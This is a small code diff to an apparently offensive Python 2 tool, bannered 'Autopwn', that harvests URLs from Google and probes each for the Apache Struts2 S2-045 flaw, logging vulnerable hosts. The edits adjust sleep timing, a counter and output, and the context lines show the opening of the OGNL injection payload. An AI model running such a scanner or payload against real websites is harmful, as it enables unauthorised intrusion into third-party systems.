@@ -60,8 +60,7 @@ class GoogleAPI:
         socket.setdefaulttimeout(timeout)
 
     def random_sleep(self):
-        # sleeptime = random.randint(60, 120)
-        sleeptime = random.randint(1, 10)
+        sleeptime = random.randint(10, 30)
         time.sleep(sleeptime)
 
     # extract a url from a link
@@ -174,6 +173,7 @@ def crawler():
 
 
 def poccheck(timeout):
+    global vuln_num
     with lock:
         print '\033[0;32m[*] poc starting\033[0m'
     poc = "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -198,7 +198,7 @@ def poccheck(timeout):
         else:
             if S2_045['key'] in res_html:
                 with lock:
-                    print '\033[1;32m[*] [VULNERABLE]\033[0m', url
+                    print '\033[1;32m[*] [VULNERABLE] %s\033[0m' % url
                     vuln_queue.put(url)
                     vuln_num += 1
                     with open('./vulnerable.txt', 'w') as vulnerable:
@@ -218,6 +218,7 @@ def banner():
     print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
     print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
     print "                                            "
+    print "                              {alpha 1.0.3} "
 
 
 @register
